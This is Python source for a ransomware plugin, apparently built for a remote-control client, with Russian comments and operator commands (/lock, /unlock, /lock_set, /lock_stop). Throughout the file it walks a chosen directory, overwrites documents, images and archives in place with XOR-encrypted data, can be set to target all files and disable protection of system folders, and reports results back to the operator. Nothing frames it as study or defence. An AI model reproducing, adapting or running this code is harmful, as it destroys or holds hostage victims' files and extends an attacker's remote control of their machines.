# NAME: Ransomware
# DESC: Шифрование выбранных данных с помощью XOR. Справка по использованию /lock_help. Возможна сильная нагрузка на систему

import os
import threading
import sys

# --- КОНФИГУРАЦИЯ ---
CFG = {
    "ext": ['.txt', '.jpg', '.png', '.docx', '.xlsx', '.pdf', '.zip'],
    "all_files": False,
    "path": None, # Если None, тянем актуальный путь из клиента
    "max_size_mb": 100,
    "exclude_sys": True
}

STOP_FLAG = False

def get_actual_client_path():
    """Вытаскивает текущий путь из основного ядра клиента"""
    # Сначала ищем в глобалах, которые прокинул exec()
    target = globals().get('current_path')
    
    # Если exec не прокинул или там пусто, берем через системный модуль
    if not target:
        try:
            # Пытаемся достать из __main__ (ядра)
            import __main__
            target = getattr(__main__, 'current_path', os.getcwd())
        except:
            target = os.getcwd()
    return target

def get_target_path():
    """Возвращает либо жестко заданный путь, либо динамический"""
    if CFG["path"]:
        return CFG["path"]
    return get_actual_client_path()

def format_bytes(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024: return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} TB"

# --- ЯДРО ---

def process_logic(key, conn, decrypt=False):
    global STOP_FLAG
    STOP_FLAG = False
    
    # ВАЖНО: Берем путь именно в момент старта!
    target_dir = get_target_path()
    sys_dirs = ['windows', 'program files', 'appdata']
    
    mode_str = "ALL FILES (*)" if CFG["all_files"] else f"EXT: {', '.join(CFG['ext'])}"
    
    send_response(conn, 
        f"💎 *LOCKER START*\n"
        f"📂 `Target:` {target_dir}\n"
        f"📑 `Mode:` {mode_str}\n"
        f"⚖️ `Limit:` {CFG['max_size_mb']} MB\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    count = 0
    total_size = 0
    
    try:
        for root, dirs, files in os.walk(target_dir):
            if STOP_FLAG: break
            
            if CFG["exclude_sys"] and any(s in root.lower() for s in sys_dirs):
                continue

            for file in files:
                if STOP_FLAG: break
                
                is_target = CFG["all_files"] or file.lower().endswith(tuple(CFG['ext']))
                if not is_target: continue

                file_path = os.path.join(root, file)
                try:
                    f_size = os.path.getsize(file_path)
                    if f_size > (CFG['max_size_mb'] * 1024 * 1024): continue

                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    processed = XOR_cipher(data, key)
                    
                    with open(file_path, 'wb') as f:
                        f.write(processed)
                    
                    count += 1
                    total_size += f_size
                except: continue

        status = "РАСШИФРОВАНО" if decrypt else "ЗАШИФРОВАНО"
        send_response(conn, 
            f"✅ *ГОТОВО*\n"
            f"📊 Объектов: {count}\n"
            f"📦 Объем: {format_bytes(total_size)}\n"
            f"🔑 Статус: {status}"
        )
    except Exception as e:
        send_response(conn, f"❌ Error: {str(e)}")

# --- КОМАНДЫ ---

def cmd_lock_set(args, conn):
    if not args:
        # Прямо здесь вызываем получение пути, чтобы в конфиге была правда
        current = get_target_path()
        ext_view = "*" if CFG["all_files"] else ", ".join(CFG["ext"])
        return (
            "```yaml\n"
            "--- [ LOCKER CONFIG ] ---\n"
            f"Target_Path: {current}\n"
            f"Extensions:  {ext_view}\n"
            f"Max_Size:    {CFG['max_size_mb']} MB\n"
            f"Safe_Mode:   {'ON' if CFG['exclude_sys'] else 'OFF'}\n"
            "```"
        )

    parts = args.split(maxsplit=1)
    if len(parts) < 2: return "⚠️ Ошибка. См. /lock_help"
    
    key, val = parts[0].lower(), parts[1].strip()

    if key == "ext":
        if val == "*":
            CFG["all_files"] = True
            return "⚙️ Режим: *ВСЕ ФАЙЛЫ*"
        else:
            CFG["all_files"] = False
            CFG["ext"] = [f".{x.strip().replace('.', '')}" for x in val.replace(',', ' ').split() if x.strip()]
            return f"⚙️ Расширения: `{', '.join(CFG['ext'])}`"

    elif key == "size":
        CFG["max_size_mb"] = int(val)
        return f"⚖️ Лимит: **{val} MB**"

    elif key == "path":
        if val.lower() == "auto":
            CFG["path"] = None
            return "📍 Путь: **DYNAMIC** (следует за /cd)"
        if os.path.exists(val):
            CFG["path"] = val
            return f"📍 Путь зафиксирован: `{val}`"
        return "❌ Путь не найден."

    elif key == "safe":
        CFG["exclude_sys"] = (val.lower() == "on")
        return f"🛡 Safe Mode: **{val.upper()}**"

    return "❓ Неизвестный параметр."

def cmd_lock(args, conn):
    if not args: return "⚠️ Пароль?"
    threading.Thread(target=process_logic, args=(args.strip(), conn, False), daemon=True).start()

def cmd_unlock(args, conn):
    if not args: return "⚠️ Пароль?"
    threading.Thread(target=process_logic, args=(args.strip(), conn, True), daemon=True).start()

def cmd_lock_help(args, conn):
    return (
        "```STORM\n"
        "--- [ LOCKER HELP ] ---\n"
        "/lock_set ext * | Шифровать все\n"
        "/lock_set ext doc txt    | Только типы\n"
        "/lock_set path auto      | Следовать за /cd\n"
        "/lock_set path C:\\       | Жесткий путь\n"
        "/lock_set size 100       | Лимит в МБ\n"
        "/lock_set                | Открытие конфига\n "
        "/lock_set safe off       | Выкл. защиту системных папок\n\n"
        "/lock <pass>   /unlock <pass>   /lock_stop\n"
        "```"
    )

PLUGINS = {
    "/lock": cmd_lock,
    "/unlock": cmd_unlock,
    "/lock_set": cmd_lock_set,
    "/lock_help": cmd_lock_help,
    "/lock_stop": lambda a, c: globals().update(STOP_FLAG=True) or "🛑 STOP SIGNAL SENT"
}